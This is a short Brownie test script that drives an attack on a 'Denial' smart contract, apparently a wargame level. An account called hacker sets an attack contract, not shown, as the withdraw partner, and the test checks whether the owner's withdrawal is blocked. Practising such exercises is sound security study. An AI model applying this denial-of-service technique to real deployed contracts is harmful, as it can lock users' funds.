import brownie
from brownie import accounts, Denial, DenialAttack, Wei

def test_attack():
    owner = accounts[0]
    hacker = accounts[1]
    target = Denial.deploy({'from': owner})
    owner.transfer(to=target, amount="1 ether")
    hacker.transfer(to=target, amount="1 ether")
    assert target.balance() == 2 * Wei("1 ether")
    old_balance = target.balance()
    attack = DenialAttack.deploy({'from': hacker})
    target.setWithdrawPartner(attack, {'from': hacker})
    target.withdraw({'from': owner, 'gas_limit': 1000000})
    assert target.balance() == (old_balance * 98 / 100)
    #with brownie.reverts():
    # target.withdraw({'from': owner, 'gas_limit': 900000})
    
